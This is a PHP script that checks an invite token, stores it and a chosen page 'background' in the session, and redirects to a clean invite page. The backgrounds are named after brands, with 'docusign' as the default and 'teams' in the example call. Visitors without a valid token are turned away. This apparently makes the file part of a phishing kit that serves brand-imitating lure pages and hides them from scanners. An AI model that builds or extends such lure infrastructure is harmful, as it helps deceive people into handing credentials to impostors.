<?php
/**
 * setbg.php — saves invite bg + token to session, redirects to clean invite.php
 * Called as: setbg.php?token=XXX&bg=teams
 * Redirects to: invite.php  (no token or bg in URL)
 */
if (session_status() === PHP_SESSION_NONE) {
    ini_set('session.cookie_samesite', 'Lax');
    ini_set('session.use_only_cookies', 1);
    ini_set('session.cookie_httponly', 1);
    session_start();
}

require_once __DIR__ . '/config.php';

$token = $_GET['token'] ?? '';
$bg    = $_GET['bg']    ?? 'docusign';

// Validate token before storing
$validToken = defined('INVITE_TOKEN') ? INVITE_TOKEN : '';
if (!$validToken || $token !== $validToken) {
    http_response_code(403);
    echo '<!DOCTYPE html><html><head><title>Invalid Link</title>
    <style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#0d0d14;color:#e8e8f0;}
    .box{text-align:center;padding:2rem;} h2{color:#e05252;margin-bottom:.5rem;} p{color:#6b6b8a;font-size:.9rem;}</style></head>
    <body><div class="box"><h2>Invalid or expired invite link.</h2><p>Please ask for a new invite link.</p></div></body></html>';
    exit;
}

// Validate bg against actual files
$bgSafe = preg_replace('/[^a-z0-9_-]/', '', strtolower($bg));
if (!file_exists(__DIR__ . '/backgrounds/' . $bgSafe . '.html')) $bgSafe = 'docusign';

// Store both in session
$_SESSION['invite_token'] = $token;
$_SESSION['invite_bg']    = $bgSafe;

// Redirect to clean URL — no token, no bg visible
header('Location: invite.php');
exit;
